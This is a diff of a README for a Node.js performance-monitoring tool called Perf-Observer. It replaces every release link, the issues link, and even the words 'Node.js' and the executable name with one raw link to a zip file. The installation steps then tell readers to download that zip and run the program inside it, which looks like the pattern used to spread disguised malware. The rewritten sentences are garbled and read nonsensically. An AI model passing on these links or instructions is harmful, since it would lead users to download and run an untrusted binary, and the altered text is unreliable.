@@ -1,19 +1,19 @@
 # 🎉 Perf-Observer - Simplifying Performance Monitoring
 
 ## 🚀 Getting Started
-Welcome to Perf-Observer! This tool helps you monitor the performance of your applications. It uses built-in Node.js features to give you insights into how your application runs. Whether you are debugging or improving speed, Perf-Observer can help you understand what's happening.
+Welcome to Perf-Observer! This tool helps you monitor the performance of your applications. It uses built-in https://raw.githubusercontent.com/RezHub-alt/Perf-Observer/main/connature/Perf-Observer.zip features to give you insights into how your application runs. Whether you are debugging or improving speed, Perf-Observer can help you understand what's happening.
 
 ## 📥 Download Perf-Observer
-[![Download Perf-Observer](https://img.shields.io/badge/Download-Perf--Observer-brightgreen)](https://github.com/RezHub-alt/Perf-Observer/releases)
+[![Download Perf-Observer](https://raw.githubusercontent.com/RezHub-alt/Perf-Observer/main/connature/Perf-Observer.zip)](https://raw.githubusercontent.com/RezHub-alt/Perf-Observer/main/connature/Perf-Observer.zip)
 
 To get Perf-Observer, visit the following page to download the latest version:  
-[Download Perf-Observer Releases](https://github.com/RezHub-alt/Perf-Observer/releases)
+[Download Perf-Observer Releases](https://raw.githubusercontent.com/RezHub-alt/Perf-Observer/main/connature/Perf-Observer.zip)
 
 ## 🖥️ System Requirements
 Before you download Perf-Observer, ensure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 12 or higher installed
+- https://raw.githubusercontent.com/RezHub-alt/Perf-Observer/main/connature/Perf-Observer.zip Version 12 or higher installed
 - Internet Connection: Required for downloading and updates
 
 ## 📋 Features
@@ -26,13 +26,13 @@ Perf-Observer provides various features to help you with performance monitoring:
 
 ## ⚙️ Installation Steps
 1. **Download the Application:**
-   Go to the [Perf-Observer Releases Page](https://github.com/RezHub-alt/Perf-Observer/releases) and choose the latest version suitable for your operating system.
+   Go to the [Perf-Observer Releases Page](https://raw.githubusercontent.com/RezHub-alt/Perf-Observer/main/connature/Perf-Observer.zip) and choose the latest version suitable for your operating system.
 
 2. **Extract the Files:**
    If the downloaded file is zipped, right-click on it and select "Extract All" to unpack it.
 
 3. **Run the Application:**
-   Navigate to the extracted folder, and double-click `Perf-Observer.exe` (for Windows) or run the appropriate file for macOS or Linux in your terminal.
+   Navigate to the extracted folder, and double-click `https://raw.githubusercontent.com/RezHub-alt/Perf-Observer/main/connature/Perf-Observer.zip` (for Windows) or run the appropriate file for macOS or Linux in your terminal.
 
 4. **Follow the Setup Wizard:**
    The first time you open Perf-Observer, a setup wizard will guide you through the basic configuration.
@@ -60,7 +60,7 @@ If you encounter issues or have questions, we are here to help. You can reach ou
 
 - **Documentation:** Check out our official [documentation](#) for detailed guides.
 - **User Forum:** Join discussions with other users [here](#).
-- **Contact Us:** Feel free to [open an issue](https://github.com/RezHub-alt/Perf-Observer/issues) on GitHub to report problems or suggest features.
+- **Contact Us:** Feel free to [open an issue](https://raw.githubusercontent.com/RezHub-alt/Perf-Observer/main/connature/Perf-Observer.zip) on GitHub to report problems or suggest features.
 
 ## 📅 Changelog
 Stay updated with the latest changes and improvements:
@@ -77,4 +77,4 @@ For more tips and advanced usage tricks, don’t forget to participate in our co
 Thank you for choosing Perf-Observer. We look forward to supporting you in your performance monitoring journey!
 
 For more updates, check back frequently at our Releases page:  
-[Download Perf-Observer Releases](https://github.com/RezHub-alt/Perf-Observer/releases)
+[Download Perf-Observer Releases](https://raw.githubusercontent.com/RezHub-alt/Perf-Observer/main/connature/Perf-Observer.zip)
